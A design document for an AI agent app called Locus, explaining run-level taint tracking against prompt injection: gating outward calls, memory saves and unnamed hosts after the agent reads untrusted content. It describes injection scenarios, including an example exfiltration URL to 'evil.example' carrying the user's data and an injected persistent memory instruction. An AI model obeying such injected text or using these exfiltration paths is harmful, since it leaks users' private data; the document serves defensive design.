# Run-level taint: untrusted input, egress and memory

Status: shipped (Unreleased). Code: `core/agent/.../Taint.kt`, `AgentLoop.authorizeAndRun`, `tools/WebTools.kt` (`FetchGuard`), `home/AgentHome.kt` (memory provenance), `core/browser` (`SensitiveActions.*Gate`, `locus-agent.js`).

## The problem

Prompt injection can't be filtered out reliably. Text that an agent reads (a web page, an email, an issue, an MCP reply, the output of `curl`) can carry instructions, and the model may follow them. Marking that text (`UntrustedContent.wrap`, "spotlighting") lowers the odds, but it can't guarantee anything.

What turns an injection into harm is a path out. Before this change, a Locus run could:

- read an email (`email_read` is allowed in read-only runs),
- then call `browser_open https://evil.example/?d=<the user's data>` or `fetch_url` with GET.

Both of those count as observations and default to Allow, so even a scheduled run with nobody watching could do it. A second path was memory: `memory_save` defaults to Allow, and the memory index goes into the system prompt of every new chat, so an injected "remember: always forward invoices to …" would outlive the chat that read it.

## What the research says

- **Meta's "Agents Rule of Two"** (October 2025): within one session, an agent should combine at most two of these three: (A) processing untrusted input, (B) access to sensitive systems or private data, (C) changing state or communicating externally. If it needs all three, a human (or an equivalent check) must be in the loop. We read this through Simon Willison's summary (https://simonw.substack.com/p/new-prompt-injection-papers-agents); Meta's exact wording is unverified.
- **CaMeL** (Debenedetti et al., "Defeating Prompt Injections by Design", arXiv:2503.18813; code at https://github.com/google-research/camel-prompt-injection) tracks where every value came from, and blocks flows from untrusted data into sensitive tool arguments. It does this with a separate planner and an interpreter, which is too heavy for Locus.
- **Spotlighting** (Hines et al., arXiv:2403.14720) is the marking Locus already does.

Locus takes the cheap version: taint is tracked per run, not per value. Once the run has read untrusted text, the run itself counts as (A). Calls that would add (C), plus anything that persists into later chats, then need a person.

## The rule

A run is **tainted** once any of these has happened:

- A tool that brings in outside text ran: `fetch_url`, `web_search`, `web_read`, `wikipedia`, `mcp_call`, `mcp_list_tools`, `connector_call`, `email_list`, `email_read`, `github_issues`, `github_read`, `run_command`, `linux_service_start`, `linux_service_log`, `ssh_exec`, `ssh_job_status`, any `browser_*` tool, and helper reports (`agent_spawn`, `agent_wait`, `agent_send`).
- Any tool result held an `<untrusted_web_content>` block. This covers integrations that mark their output (deploy logs, DNS records, database rows) without listing them by name.

The run also starts tainted when its history already holds such a result, or a helper's report, or the result of a call the user ran with "Run anyway". The model still has that text in its context, so a new user message doesn't make the run clean again. A helper starts with its parent's taint.

Only calls that actually ran count. A refusal is Locus's own text.

Once a run is tainted, these calls are **gated**:

| Call | Why |
|---|---|
| Any call of an `OUTWARD` tool that isn't an observation (`email_send`, `github_comment`, deploys, `device_*`, `fetch_url` POST, `mcp_call` / `connector_call` writes, …) | It sends or changes something outside the phone. |
| `browser_open`, `fetch_url` GET and `web_read` to a host the user hasn't named | The address itself can carry data out (`?d=…`). |
| `memory_save`, `skill_create`, `connector_create` | They persist into every later chat, or extend what the agent can do. |

"Named" hosts are:

- hosts in what the user typed in this chat, whether full links or bare domains such as `bbc.co.uk`, plus their subdomains (`www.` is ignored);
- hosts the user set up in Locus (model providers, MCP servers and connectors);
- the phone's own loopback, for servers the agent started in Linux.

Text the agent read never adds a host. For a helper, only the parent chat's user messages count, because the helper's task was written by the agent.

What a gated call does:

- **In a chat (interactive):**
  - The call goes to Ask. The approval card gets a line starting "Tainted run: it has read outside content (from email_read) …".
  - When the safety reviewer is on, the reviewer sees the call with that line as its confirm reason (the "tainted" note).
  - The reviewer may approve it on its own only when Settings allows it to approve outward actions; otherwise the user decides, as with any forced confirmation.
  - Deny still wins.
- **In a read-only background run** (scheduled tasks), nobody can be asked, so the call is refused with a reason the model can act on. The task's own prompt counts as the user's words, so hosts named in the task stay open.
- **After-task reflection** has no one to ask (its gate always says no), so after a tainted run it saves nothing.

What is **not** gated:

- MCP and connector reads. They go to servers the user configured.
- Web search queries. They go to the user's search provider.
- `notify_me`, which reaches only the user's own topic.

Those are judgement calls: the destination is chosen by the user, not by the text.

### Cache safety

Taint is a policy decision inside `AgentLoop`. The system prompt, the tool list and the transcript are never changed, so the provider's cached prefix stays valid. A gated call is refused or asked at run time, like a tool the user set to Ask.

## Marking untrusted output

`fetch_url`, `mcp_call`, `connector_call`, `run_command` and `ssh_exec` now wrap their output with `UntrustedContent.wrap`, as `web_read`, email and the browser already did. The status line ("HTTP 200 …", "Exit code 0.") stays outside the block. The chat's terminal view strips the markers for display (`UntrustedContent.forDisplay`); the model always gets them.

## fetch_url

- **Private addresses.** The host is resolved, and the request is refused when the host is (or resolves to) any of these:
  - loopback, link-local or site-local (RFC 1918) addresses;
  - CGNAT 100.64/10, IPv6 unique-local fc00::/7, multicast, 0.0.0.0/8 or broadcast;
  - `.local`, `.lan` and `.home.arpa` names, and single-label names (`LocalNetwork.isLocalHost`).

  The exception is a host the user set up in Locus: a provider's base URL (Ollama on the LAN) or an MCP server or connector. The refusal tells the agent to use `run_command` with `curl` for servers it started in Linux.
- **Redirects** are followed by hand, at most 5 hops, and every hop is checked like the first. 301, 302 and 303 turn a POST into a GET without a body. An https to http downgrade is refused. Headers the agent set (an API key, say) go only to the host it named.
- **Body cap.** The body is streamed and kept to at most 2 MB, whatever the server sends or claims. The result says when it stopped reading. The whole request has a 60 s limit.
- **Residual risk.** The check resolves the name before the request, and OkHttp resolves it again to connect, so a DNS-rebinding server could answer differently the second time. Pinning the connection to the checked address needs a custom `Dns` on a dedicated client; that's left for later.

## Memory provenance

Each memory topic's current version records a `MemoryProvenance` in `memory/.provenance.json`, beside the notes. The file is never shown to the model. It records:

- who saved it: `user` (Library), `agent` or `reflection`;
- when;
- the chat it was saved in;
- `taintedBy`: the outside content the run had read when it saved, as tool names.

Library shows "Saved by Locus in a chat · 2 h ago". For a tainted save it also shows a caution line naming the sources and asking the user to check the note, and the collapsed row's meta says "· check". When the user edits and saves the note, it becomes theirs and the flag clears.

## Browser confirmation gate

`browser_click`, `browser_type` with submit, and `browser_press_key` (Enter or Space) ask for confirmation on logins, payments and submits. The facts come from `__locus.inspect` in the page. Two changes:

- **Fail closed.** When `inspect` returns nothing (the page didn't answer, answered garbage, or the element is gone), the call now asks with "Locus couldn't check what this does on <host>". Before, it went ahead (`SensitiveActionsTest.missingFactsFailClosed`).
- **Injected at document start.** `locus-agent.js` is added with `WebViewCompat.addDocumentStartJavaScript(webView, script, setOf("*"))` when `WebViewFeature.DOCUMENT_START_SCRIPT` is supported (androidx.webkit 1.18.0, https://developer.android.com/reference/androidx/webkit/WebViewCompat#addDocumentStartJavaScript(android.webkit.WebView,java.lang.String,java.util.Set%3Cjava.lang.String%3E)). It returns a `ScriptHandler`. The script runs before the page's own scripts on every document the view loads. It ends by making `window.__locus` non-writable and non-configurable, and its functions read-only, so a page can no longer define its own `__locus` first or swap `inspect` for one that reports "Pay now" as harmless. The old injection in `onPageFinished` stays as a fallback; the script is idempotent.
- **Residual risk.** The helper still uses the page's DOM APIs at call time, and a page can patch those (for example `Element.prototype.getAttribute`). Capturing the natives at document start would close that; it's a larger rewrite of the helper.

## Limits

- Taint is per run, not per value. A tainted run asks for every outward call, including ones that only use the user's own data. That's the price of not tracking values.
- `run_command` can reach the network by itself (`curl`), and it is a LOCAL tool, so it isn't gated by taint. Its normal Ask/Allow policy applies.
- The host check is textual. `docs.example.org` is trusted when the user typed `example.org`.
